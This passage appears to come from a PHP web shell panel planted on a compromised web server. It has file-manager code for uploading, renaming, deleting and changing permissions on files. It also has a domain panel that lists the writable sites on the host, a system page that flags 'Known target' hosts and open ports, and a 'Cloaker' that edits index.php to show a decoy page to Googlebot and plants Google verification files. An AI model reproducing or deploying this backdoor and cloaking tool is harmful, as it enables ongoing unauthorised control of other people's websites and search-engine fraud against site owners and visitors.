    if(inp) setTimeout(function(){ inp.focus(); }, 100);
}

function closeModal(id) {
    document.getElementById(id).classList.remove('show');
}

function filterFiles() {
    var query = document.getElementById('searchInput').value.toLowerCase();
    var rows = document.querySelectorAll('#fileTable tbody tr');
    rows.forEach(function(row) {
        var name = row.querySelector('.file-name-text');
        if (name) {
            row.style.display = name.textContent.toLowerCase().indexOf(query) > -1 ? '' : 'none';
        }
    });
}

function doMkdir() {
    var name = document.getElementById('mkdirInput').value.trim();
    if (!name) return;
    var fd = new FormData();
    fd.append('action', 'mkdir');
    fd.append('dirname', name);
    fd.append('path', currentPath);
    fd.append('domain', domainParam);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.onload = function() {
        try {
            var r = JSON.parse(xhr.responseText);
            if (r.ok) location.reload();
            else alert(r.msg || 'Error');
        } catch(e) { location.reload(); }
    };
    xhr.send(fd);
}

function doUpload() {
    var fileInput = document.getElementById('uploadFile');
    if (!fileInput.files.length) return;
    var prog = document.getElementById('uploadProgress');
    var bar = document.getElementById('uploadBar');
    var status = document.getElementById('uploadStatus');
    prog.style.display = 'block';
    var fd = new FormData();
    fd.append('action', 'upload');
    fd.append('file', fileInput.files[0]);
    fd.append('path', currentPath);
    fd.append('domain', domainParam);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.upload.onprogress = function(e) {
        if (e.lengthComputable) {
            var pct = Math.round((e.loaded / e.total) * 100);
            bar.style.width = pct + '%';
            status.textContent = 'Uploading... ' + pct + '%';
        }
    };
    xhr.onload = function() {
        try {
            var r = JSON.parse(xhr.responseText);
            if (r.ok) { status.textContent = 'Done!'; setTimeout(function(){ location.reload(); }, 500); }
            else { status.textContent = 'Error: ' + (r.msg || 'Unknown'); }
        } catch(e) { location.reload(); }
    };
    xhr.onerror = function() { status.textContent = 'Network error'; };
    xhr.send(fd);
}

function renameEntry(old) {
    document.getElementById('renameOld').value = old;
    document.getElementById('renameNew').value = old;
    openModal('renameModal');
    var inp = document.getElementById('renameNew');
    inp.focus();
    inp.select();
}

function doRename() {
    var old = document.getElementById('renameOld').value;
    var nw = document.getElementById('renameNew').value.trim();
    if (!nw || nw === old) { closeModal('renameModal'); return; }
    var fd = new FormData();
    fd.append('action', 'rename');
    fd.append('old', old);
    fd.append('new', nw);
    fd.append('path', currentPath);
    fd.append('domain', domainParam);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.onload = function() {
        try {
            var r = JSON.parse(xhr.responseText);
            if (r.ok) location.reload();
            else alert(r.msg || 'Error');
        } catch(e) { location.reload(); }
    };
    xhr.send(fd);
}

function deleteEntry(name) {
    document.getElementById('deleteTarget').value = name;
    document.getElementById('deleteName').textContent = name;
    openModal('deleteModal');
}

function doDelete() {
    var target = document.getElementById('deleteTarget').value;
    var fd = new FormData();
    fd.append('action', 'delete');
    fd.append('target', target);
    fd.append('path', currentPath);
    fd.append('domain', domainParam);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.onload = function() {
        try {
            var r = JSON.parse(xhr.responseText);
            if (r.ok) location.reload();
            else alert(r.msg || 'Error');
        } catch(e) { location.reload(); }
    };
    xhr.send(fd);
}

function chmodEntry(name) {
    document.getElementById('chmodTarget').value = name;
    document.getElementById('chmodPerms').value = '755';
    openModal('chmodModal');
}

function doChmod() {
    var target = document.getElementById('chmodTarget').value;
    var perms = document.getElementById('chmodPerms').value.trim();
    if (!perms) return;
    var fd = new FormData();
    fd.append('action', 'chmod');
    fd.append('target', target);
    fd.append('perms', perms);
    fd.append('path', currentPath);
    fd.append('domain', domainParam);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.onload = function() {
        try {
            var r = JSON.parse(xhr.responseText);
            if (r.ok) location.reload();
            else alert(r.msg || 'Error');
        } catch(e) { location.reload(); }
    };
    xhr.send(fd);
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal-backdrop.show').forEach(function(m) {
            m.classList.remove('show');
        });
    }
});

document.querySelectorAll('.modal input[type="text"]').forEach(function(inp) {
    inp.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var modal = this.closest('.modal');
            var btn = modal.querySelector('.btn-accent, .btn');
            if (btn) btn.click();
        }
    });
});
</script>

<?php elseif ($page === 'domains'): ?>
<?php
$domains = getDomains();
$curHost = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
$totalC = count($domains);
$writableC = count(array_filter($domains, function($d) { return $d['writable']; }));
$lockedC = count(array_filter($domains, function($d) { return !$d['writable']; }));
$cmsC = count(array_filter($domains, function($d) { return $d['cms']; }));
usort($domains, function($a,$b) use($curHost) {
    $ca = fm_normDomain($a['name']) === fm_normDomain($curHost);
    $cb = fm_normDomain($b['name']) === fm_normDomain($curHost);
    if ($ca && !$cb) return -1;
    if ($cb && !$ca) return 1;
    return strcasecmp($a['name'], $b['name']);
});
?>
<div class="page-header">
    <h1 class="page-title"><i class="fas fa-globe" style="color:var(--text);margin-right:10px;"></i> Domain Panel</h1>
</div>

<div class="stats-bar">
    <span><i class="fas fa-globe"></i> <strong><?php echo $totalC; ?></strong> Total</span>
    <span style="color:#22c55e;"><i class="fas fa-lock-open"></i> <strong><?php echo $writableC; ?></strong> Writable</span>
    <span style="color:#ef4444;"><i class="fas fa-lock"></i> <strong><?php echo $lockedC; ?></strong> Read-only</span>
    <span style="color:#999;"><i class="fas fa-code"></i> <strong><?php echo $cmsC; ?></strong> CMS</span>
    <?php if ($curHost): ?>
    <span style="margin-left:auto;color:var(--text);font-size:11px;"><i class="fas fa-server"></i> <?php echo htmlspecialchars($curHost); ?></span>
    <?php endif; ?>
</div>

<?php if ($totalC > 0): ?>
<div class="toolbar">
    <div class="search-wrap">
        <i class="fas fa-search"></i>
        <input type="text" class="search-input" placeholder="Search domain..." id="domainSearch" oninput="document.querySelectorAll('#domainTable tbody tr').forEach(r=>{r.style.display=r.textContent.toLowerCase().indexOf(this.value.toLowerCase())>-1?'':'none'})">
    </div>
    <button class="btn" onclick="domCopyAll(this)" title="Copy all domains"><i class="fas fa-clipboard"></i> Copy All</button>
</div>
<script>
const allDomainNames = <?php echo json_encode(array_map(function($d){ return $d['name']; }, $domains)); ?>;
function domCopyAll(btn) {
    const txt = allDomainNames.join('\n');
    const done = () => {
        const old = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i> Copied (' + allDomainNames.length + ')';
        setTimeout(() => { btn.innerHTML = old; }, 1500);
    };
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(txt).then(done).catch(() => domCopyFallback(txt, done));
    } else {
        domCopyFallback(txt, done);
    }
}
function domCopyFallback(txt, done) {
    const ta = document.createElement('textarea');
    ta.value = txt;
    ta.style.cssText = 'position:fixed;opacity:0;left:-9999px';
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); done(); } catch(e) {}
    document.body.removeChild(ta);
}
</script>
<?php endif; ?>

<?php if ($totalC > 0): ?>
<div class="card" style="padding:0;overflow:hidden;">
<table style="width:100%;border-collapse:collapse;font-size:13px;" id="domainTable">
<thead>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.015);">
    <th style="padding:12px 16px;text-align:left;color:var(--text-ter);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Domain</th>
    <th style="padding:12px 16px;text-align:left;color:var(--text-ter);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Path</th>
    <th style="padding:12px 16px;text-align:left;color:var(--text-ter);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">CMS</th>
    <th style="padding:12px 16px;text-align:center;color:var(--text-ter);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;">Access</th>
    <th style="padding:12px 16px;text-align:right;color:var(--text-ter);font-size:11px;text-transform:uppercase;letter-spacing:.5px;font-weight:600;"></th>
</tr>
</thead>
<tbody>
<?php foreach ($domains as $i => $d):
    $isCurrent = (fm_normDomain($d['name']) === fm_normDomain($curHost));
?>
<tr style="border-bottom:1px solid var(--card-border);<?php echo $isCurrent ? 'background:rgba(59,130,246,0.04);' : ''; ?>" onmouseover="this.style.background='<?php echo $isCurrent ? 'rgba(59,130,246,0.08)' : 'rgba(255,255,255,0.025)'; ?>'" onmouseout="this.style.background='<?php echo $isCurrent ? 'rgba(59,130,246,0.04)' : 'transparent'; ?>'">
    <td style="padding:12px 16px;">
        <a href="?page=domainfiles&domain=<?php echo urlencode($d['name']); ?>" style="color:var(--text);text-decoration:none;font-weight:600;font-size:13px;">
            <?php echo htmlspecialchars($d['name']); ?>
        </a>
        <?php if ($isCurrent): ?>
        <span style="display:inline-block;margin-left:8px;padding:2px 8px;background:rgba(59,130,246,0.12);border:1px solid rgba(59,130,246,0.25);border-radius:12px;font-size:10px;color:var(--text);font-weight:600;vertical-align:middle;">HERE</span>
        <?php endif; ?>
        <?php if (!$d['exists']): ?>
        <span style="display:inline-block;margin-left:8px;padding:2px 8px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:12px;font-size:10px;color:#ef4444;font-weight:600;vertical-align:middle;">NOT FOUND</span>
        <?php endif; ?>
    </td>
    <td style="padding:12px 16px;color:var(--text-ter);font-family:'JetBrains Mono',monospace;font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="<?php echo htmlspecialchars($d['root']); ?>">
        <?php echo htmlspecialchars($d['root']); ?>
    </td>
    <td style="padding:12px 16px;">
        <?php if ($d['cms']): ?>
        <span style="display:inline-flex;align-items:center;gap:5px;padding:3px 10px;background:rgba(255,255,255,0.05);border:1px solid var(--card-border);border-radius:16px;font-size:11px;font-weight:600;color:var(--text);">
            <i class="<?php echo htmlspecialchars($d['cms']['icon']); ?>" style="font-size:11px;"></i>
            <?php echo htmlspecialchars($d['cms']['name']); ?>
            <span style="color:var(--text-ter);font-weight:400;"><?php echo $d['cms']['confidence']; ?>%</span>
        </span>
        <?php if ($d['cms']['version']): ?>
        <span style="margin-left:4px;font-size:10px;color:var(--text-ter);">v<?php echo htmlspecialchars($d['cms']['version']); ?></span>
        <?php endif; ?>
        <?php else: ?>
        <span style="font-size:11px;color:var(--text-ter);">-</span>
        <?php endif; ?>
    </td>
    <td style="padding:12px 16px;text-align:center;">
        <?php if ($d['writable']): ?>
        <span style="display:inline-flex;align-items:center;gap:4px;padding:3px 10px;background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.2);border-radius:16px;font-size:11px;font-weight:600;color:#22c55e;">
            <i class="fas fa-lock-open" style="font-size:9px;"></i> W
        </span>
        <?php else: ?>
        <span style="display:inline-flex;align-items:center;gap:4px;padding:3px 10px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:16px;font-size:11px;font-weight:600;color:#ef4444;">
            <i class="fas fa-lock" style="font-size:9px;"></i> R
        </span>
        <?php endif; ?>
    </td>
    <td style="padding:12px 16px;text-align:right;">
        <a href="?page=domainfiles&domain=<?php echo urlencode($d['name']); ?>" style="display:inline-flex;align-items:center;gap:5px;padding:6px 14px;background:rgba(59,130,246,0.1);border:1px solid rgba(59,130,246,0.2);border-radius:8px;color:var(--text);text-decoration:none;font-size:12px;font-weight:600;transition:all .15s;" onmouseover="this.style.background='rgba(59,130,246,0.2)'" onmouseout="this.style.background='rgba(59,130,246,0.1)'">
            <i class="fas fa-folder-open" style="font-size:11px;"></i> Open
        </a>
    </td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</div>

<?php else: ?>
<div class="card" style="text-align:center;padding:60px 20px;">
    <i class="fas fa-globe" style="font-size:48px;color:var(--text-ter);margin-bottom:16px;display:block;opacity:0.3;"></i>
    <p style="color:var(--text-sec);font-size:15px;margin:0 0 6px;">No domains found</p>
    <p style="color:var(--text-ter);font-size:12px;">Create domains.json or check hosting folders</p>
</div>
<?php endif; ?>

<?php elseif ($page === 'system'): ?>
<?php $sys = getSystemInfo(); ?>
<div class="page-header">
    <h1 class="page-title"><i class="fas fa-server" style="margin-right:10px;"></i> System Details</h1>
</div>

<div class="card" style="padding:0;overflow:auto;">
<table style="width:100%;border-collapse:collapse;font-size:13px;table-layout:fixed;">
<tr style="border-bottom:1px solid var(--card-border);">
    <td style="padding:10px 16px;color:var(--text-sec);width:140px;font-weight:600;">PHP</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['php_version']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">cURL</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['curl_version']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Server</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['server_software']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Host</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['server_name']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Host name</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['hostname']); ?><span style="color:var(--text-ter);font-size:11px;font-family:'Inter',sans-serif;margin-left:8px;">(IP: <?php echo htmlspecialchars($sys['server_ip']); ?>)</span></td>
    <td style="padding:10px 16px;text-align:right;">
    <?php if (fmKnownHostMatch(isset($sys['hostname']) ? $sys['hostname'] : '')): ?>
        <span style="display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.3);color:#22c55e;font-size:11px;font-weight:600;"><i class="fas fa-circle" style="font-size:7px;"></i> Known target</span>
    <?php else: ?>
        <span style="display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;background:rgba(255,255,255,.03);border:1px solid var(--card-border);color:var(--text-ter);font-size:11px;font-weight:600;"><i class="fas fa-circle" style="font-size:7px;"></i> Unknown host</span>
    <?php endif; ?>
    </td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">External IP</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;font-weight:600;">
        <?php echo htmlspecialchars($sys['external_ip']); ?>
        <?php if ($sys['proxy_label']): ?>
        <span style="margin-left:8px;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:500;background:rgba(255,255,255,0.06);color:var(--text-sec);border:1px solid var(--card-border);font-family:'Inter',sans-serif;">(<?php echo htmlspecialchars($sys['proxy_label']); ?>)</span>
        <?php endif; ?>
    </td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">User</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['user']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Root</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;word-break:break-all;"><?php echo htmlspecialchars($sys['document_root']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Script</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;word-break:break-all;"><?php echo htmlspecialchars($sys['script']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">OS</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;word-break:break-all;"><?php echo htmlspecialchars($sys['os']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Disk</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['disk_total']); ?> / <?php echo htmlspecialchars($sys['disk_free']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">allow_url</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;"><?php echo htmlspecialchars($sys['allow_url_fopen']); ?></td>
</tr>
<tr style="border-bottom:1px solid var(--card-border);background:rgba(255,255,255,0.02);">
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;">Open Ports</td>
    <td style="padding:10px 16px;font-family:'JetBrains Mono',monospace;">
        <?php if (empty($sys['open_ports'])): ?>
        <span style="color:var(--text-ter);">No open ports found in scan</span>
        <?php else: ?>
        <?php foreach ($sys['open_ports'] as $pi => $p): ?>
        <span style="display:inline-block;padding:2px 10px;margin:2px 4px;border-radius:20px;font-size:11px;font-weight:600;background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#22c55e;"><?php echo (int)$p; ?></span>
        <?php endforeach; ?>
        <?php endif; ?>
    </td>
</tr>
<tr>
    <td style="padding:10px 16px;color:var(--text-sec);font-weight:600;vertical-align:top;">Disabled</td>
    <td style="padding:10px 16px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11px;word-break:break-all;line-height:1.8;"><?php echo htmlspecialchars($sys['disabled_functions']); ?></td>
</tr>
</table>
</div>
<?php elseif ($page === 'cloak'): ?>
<?php
$cRoot = rtrim(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__), '/\\');
$cCMS = 'generic'; $cCMSLabel = 'Generic';
if (file_exists($cRoot . '/wp-config.php') || is_dir($cRoot . '/wp-includes')) { $cCMS = 'wp'; $cCMSLabel = 'WordPress'; }
elseif (file_exists($cRoot . '/configuration.php') && is_dir($cRoot . '/administrator')) { $cCMS = 'joomla'; $cCMSLabel = 'Joomla'; }
elseif (file_exists($cRoot . '/../bootstrap/app.php') || file_exists($cRoot . '/../artisan')) { $cCMS = 'laravel'; $cCMSLabel = 'Laravel'; }
elseif (file_exists($cRoot . '/sites/default/settings.php')) { $cCMS = 'drupal'; $cCMSLabel = 'Drupal'; }
$pdir = $cRoot . '/.render-cache';
$aktif = file_exists($pdir . '/render.lock');
$perde_var = file_exists($pdir . '/render-cache.html') && filesize($pdir . '/render-cache.html') > 100;
$google_files = array();
foreach ((array)@glob($cRoot . '/google*.html') as $gf) { if (preg_match('/^google[a-zA-Z0-9]+\.html$/', basename($gf))) $google_files[] = basename($gf); }
sort($google_files);
?>
<style>
.clk-card{background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius);padding:20px;margin:14px 0;}
.clk-row{display:flex;align-items:center;gap:10px;margin:6px 0;font-size:13px;flex-wrap:wrap;}
.clk-lbl{color:var(--text-sec);min-width:110px;font-weight:500;}
.clk-tag{display:inline-flex;align-items:center;gap:4px;padding:2px 10px;border-radius:20px;font-size:11px;font-weight:600;background:rgba(255,255,255,0.05);color:var(--text);border:1px solid var(--card-border);}
.clk-cs{display:inline-flex;align-items:center;gap:8px;padding:4px 14px;border-radius:20px;font-size:12px;font-weight:600;}
.clk-cs.on{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#22c55e;}
.clk-cs.off{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#ef4444;}
.clk-cs.na{background:rgba(255,255,255,0.03);border:1px solid var(--card-border);color:var(--text-ter);}
.clk-br{display:flex;gap:8px;margin:10px 0;flex-wrap:wrap;}
.clk-btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;cursor:pointer;padding:8px 18px;border:none;font-family:inherit;font-size:13px;font-weight:600;border-radius:8px;color:#fff;transition:all .2s;white-space:nowrap;}
.clk-btn:hover{opacity:.9;transform:translateY(-1px);}
.clk-btn:active{transform:translateY(0);}
.clk-btn-p{background:#22c55e;}.clk-btn-p:hover{background:#16a34a;}
.clk-btn-w{background:#f59e0b;}.clk-btn-w:hover{background:#d97706;}
.clk-btn-d{background:#ef4444;}.clk-btn-d:hover{background:#dc2626;}
.clk-btn-i{background:var(--text);color:var(--bg);}.clk-btn-i:hover{background:#ccc;}
.clk-btn-a{background:#a855f7;}.clk-btn-a:hover{background:#9333ea;}
.clk-btn-s{background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--card-border);}.clk-btn-s:hover{background:rgba(255,255,255,0.1);}
.clk-msg{padding:10px 14px;border-radius:8px;margin:8px 0;font-size:13px;font-weight:500;display:none;line-height:1.5;}
.clk-msg.ok{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;display:block;}
.clk-msg.err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;display:block;}
.clk-msg.info{background:rgba(59,130,246,.08);border:1px solid rgba(59,130,246,.2);color:#fff;display:block;}
.clk-ta{background:var(--bg);color:var(--text);border:1px solid var(--card-border);padding:10px;font-family:'JetBrains Mono',monospace;font-size:13px;width:100%;height:160px;border-radius:8px;resize:vertical;transition:border-color .2s;}
.clk-ta:focus{outline:none;border-color:#fff;}
.clk-inp{background:var(--bg);color:var(--text);border:1px solid var(--card-border);padding:8px 12px;font-family:inherit;font-size:13px;border-radius:8px;width:100%;transition:border-color .2s;}
.clk-inp:focus{outline:none;border-color:#fff;}
.clk-guide{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:16px 20px;margin:14px 0;}
.clk-guide-title{font-size:13px;font-weight:600;color:#fff;margin-bottom:10px;}
.clk-step{display:flex;align-items:flex-start;gap:10px;margin:8px 0;font-size:13px;color:var(--text-sec);}
.clk-step-num{background:var(--text);color:var(--bg);border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;}
.clk-step b{color:var(--text);}
.clk-glink{background:rgba(245,158,11,.06);border:1px solid rgba(245,158,11,.2);border-radius:8px;padding:10px 14px;margin:10px 0;font-size:13px;text-align:center;}
.clk-glink a{color:#f59e0b;font-weight:600;text-decoration:none;}
</style>

<div class="page-header">
    <h1 class="page-title"><i class="fas fa-mask" style="color:var(--text);margin-right:10px;"></i> Cloaker</h1>
</div>

<div class="clk-card">
    <div style="font-size:14px;font-weight:600;color:#22c55e;margin:0 0 12px;">STATUS</div>
    <div class="clk-row"><span class="clk-lbl">Cloak:</span><span class="clk-cs <?=$aktif?'on':($perde_var?'off':'na')?>"><?=$aktif?'ACTIVE':($perde_var?'DISABLED':'NOT INSTALLED')?></span></div>
    <div class="clk-row"><span class="clk-lbl">CMS:</span><span class="clk-tag"><?=$cCMSLabel?></span></div>
    <div class="clk-row"><span class="clk-lbl">Decoy:</span><span style="color:var(--text);font-size:13px;"><?=$perde_var ? filesize($pdir.'/render-cache.html').'B' : 'NONE'?></span>
    <?php if ($perde_var): ?><a href="?page=cloak&a=viewperde" target="_blank" style="color:#fff;font-size:11px;margin-left:6px;">[View]</a><?php endif; ?>
    </div>

    <div class="clk-guide">
        <div class="clk-guide-title">USAGE ORDER</div>
        <div class="clk-step"><span class="clk-step-num">1</span><div><b>Decoy HTML</b> — Paste the HTML page you want to show Google bot into the box below, then click <b>Save</b>.</div></div>
        <div class="clk-step"><span class="clk-step-num">2</span><div><b>Install Cloak</b> — Click <b>Install Cloak</b>. The system edits index.php and activates the cloak.</div></div>
        <div class="clk-step"><span class="clk-step-num">3</span><div><b>Test</b> — Try with <b>Bot Test</b> or click <b>Rich Results Test</b>.</div></div>
    </div>

    <?php foreach ($google_files as $gf): ?>
    <div class="clk-row"><span class="clk-lbl">Google:</span><span style="color:var(--text);"><?=$gf?></span> <a href="#" onclick="clkRmG('<?=htmlspecialchars($gf, ENT_QUOTES)?>');return false" style="color:#ef4444;font-size:11px;margin-left:6px;">[Delete]</a></div>
    <?php endforeach; ?>
</div>

<div class="clk-card">
    <div style="font-size:14px;font-weight:600;color:#22c555;margin:0 0 12px;">ACTIONS</div>
    <div class="clk-br">
        <button class="clk-btn clk-btn-i" onclick="clkPc()">Pre-check</button>
        <button class="clk-btn clk-btn-p" onclick="clkAc()">Install Cloak</button>
        <button class="clk-btn clk-btn-w" onclick="clkBt()">Bot Test</button>
        <button class="clk-btn clk-btn-a" onclick="clkRv()">Disable Cloak</button>
        <button class="clk-btn clk-btn-s" onclick="clkCc()">Clear Cache</button>
        <button class="clk-btn clk-btn-s" onclick="clkFts()">Timestamp</button>
        <button class="clk-btn clk-btn-d" onclick="clkUi()">Remove</button>
    </div>
    <div class="clk-br">
        <button class="clk-btn" style="background:rgba(255,255,255,0.04);color:#f59e0b;border:1px solid rgba(245,158,11,.3);" onclick="clkCht()">Clean .htaccess</button>
    </div>
    <div class="clk-glink">
        <a href="https://search.google.com/test/rich-results?url=<?=urlencode((!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http').'://'.$_SERVER['HTTP_HOST'])?>" target="_blank">Rich Results Test ↗</a>
    </div>
    <div id="clkMsg" class="clk-msg"></div>
    <div id="clkRa" class="clk-msg" style="display:none;"></div>
</div>

<div class="clk-card">
    <div style="font-size:14px;font-weight:600;color:#22c55e;margin:0 0 12px;">DECOY HTML</div>
    <div style="font-size:11px;color:var(--text-ter);margin-bottom:6px;">Page shown to Googlebot. Save first, then Install Cloak.</div>
    <textarea id="clkPh" class="clk-ta" placeholder="Decoy HTML..."></textarea>
    <div class="clk-br" style="margin-top:6px;"><button class="clk-btn clk-btn-i" onclick="clkLp()">Load</button><button class="clk-btn clk-btn-p" onclick="clkSp()">Save</button></div>
    <div id="clkPmsg" class="clk-msg"></div>
</div>

<div class="clk-card">
    <div style="font-size:14px;font-weight:600;color:#22c55e;margin:0 0 8px;">Google Verification File</div>
    <div style="font-size:11px;color:var(--text-ter);margin-bottom:6px;">Upload Google Search Console verification file.</div>
    <input type="text" id="clkGn" class="clk-inp" placeholder="google....html">
    <input type="text" id="clkGc" class="clk-inp" placeholder="google-site-verification: TOKEN" style="margin-top:4px;">
    <div class="clk-br" style="margin-top:6px;"><button class="clk-btn clk-btn-p" onclick="clkUg()">Upload</button></div>
    <div id="clkGm" class="clk-msg"></div>
</div>

<script>
var CK='page=cloak';
function clkMsg(id,t,ty){var e=document.getElementById(id);e.textContent=t;e.className='clk-msg '+(ty||'info');e.style.display=t?'block':'none';}
function clkPc(){
clkMsg('clkMsg','Pre-check running...','info');document.getElementById('clkRa').style.display='none';
var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=precheck&_='+Date.now());
x.onload=function(){try{var r=JSON.parse(x.responseText);var h='<b>Score: '+r.score+'/100</b><br>';for(var i=0;i<r.checks.length;i++){var c=r.checks[i];var ic=c.s==='ok'?'✓':(c.s==='warn'?'!':'✗');var cl=c.s==='ok'?'#22c55e':(c.s==='warn'?'#f59e0b':'#ef4444');h+='<div style="color:'+cl+';margin:2px 0">'+ic+' '+c.name+': '+c.v+' - '+c.m+'</div>';}document.getElementById('clkRa').innerHTML=h;document.getElementById('clkRa').style.display='block';clkMsg('clkMsg','','');}catch(e){clkMsg('clkMsg','Error: '+x.responseText,'err');}};x.send();}
function clkAc(){
clkMsg('clkMsg','Installing cloak...','info');
var n=document.getElementById('clkPh').value.trim();if(n.length<50){clkMsg('clkMsg','Paste decoy HTML and SAVE first!','err');return;}
var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=autocloak&_='+Date.now());
x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.status==='ok'){clkMsg('clkMsg','Cloak installed!','ok');setTimeout(function(){location.reload()},1500);}else clkMsg('clkMsg','Error','err');}catch(e){clkMsg('clkMsg','Error','err');}};x.send();}
function clkRv(){if(!confirm('Disable cloak?'))return;clkMsg('clkMsg','Disabling...','info');var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=revert&_='+Date.now());x.onload=function(){try{var r=JSON.parse(x.responseText);clkMsg('clkMsg',r.msg,'ok');setTimeout(function(){location.reload()},1000);}catch(e){clkMsg('clkMsg','Error','err');}};x.send();}
function clkUi(){if(!confirm('REMOVE COMPLETELY?'))return;clkMsg('clkMsg','Removing...','info');var x=new XMLHttpRequest();x.open('GET','?'+CK+'&a=uninstall&_='+Date.now());x.onload=function(){try{var r=JSON.parse(x.responseText);clkMsg('clkMsg',r.msg,'ok');setTimeout(function(){location.reload()},1000);}catch(e){clkMsg('clkMsg','Error','err');}};x.send();}
